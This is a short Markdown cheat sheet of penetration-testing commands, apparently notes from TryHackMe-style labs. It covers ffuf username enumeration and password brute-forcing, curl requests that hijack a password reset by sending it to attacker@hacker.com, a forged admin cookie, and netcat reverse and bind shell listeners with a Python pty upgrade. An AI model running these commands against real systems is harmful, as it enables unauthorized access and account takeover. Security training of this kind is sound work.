# Upgrades

    sudo apt update -y && sudo apt upgrade -y


# Enumeration (subdomains)(username)(atthentication bypass)
# ffuf

    ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.54.22/customers/signup -mr "username already exists" -fs {size}


-w wordlists path

-u url ex https://google.com

-H host/header

-fs switch, which tells ffuf to ignore any results that are of the specified size.

-d argument specifies the data that we are going to send

-mr argument is the text on the page we are looking for to validate we've found a valid username.

-X method of request {POST,GET ,DELETE}

-fc argument to check for an HTTP status code other than 200.

= FUZZ //worldlists content

    ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.54.22/customers/login -fc 200

# Curl
    curl 'http://10.10.54.22/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert'
    curl 'http://10.10.54.22/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
    curl -H "Cookie: logged_in=true; admin=true" http://MACHINE_IP/cookie-test
    
# Nmap
    nmap -sV -sC -A http//ip/ -oN output.txt
    
    
# SSH
    ssh username@ip
  
  
# SU
    switch user: su - username 
    sudo su username
  
  
# ftp(file transfer protocol)
    ftp ip
    get filename
    
# netcat

reverse shell ports(443,53,80)

the first syntax is for reverse shell

the seceond one is for bind shell

    nc -lvnp <port-number>
    nc <target-ip> <chosen-port>
    
-l is used to tell netcat that this will be a listener

-v is used to request a verbose output

-n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.

-p indicates that the port specification will follow.

   making the shell stable

    python -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm

![nc](https://user-images.githubusercontent.com/98187755/212935020-c11aea4e-611a-47df-9673-1fe87c8b4fe8.png)
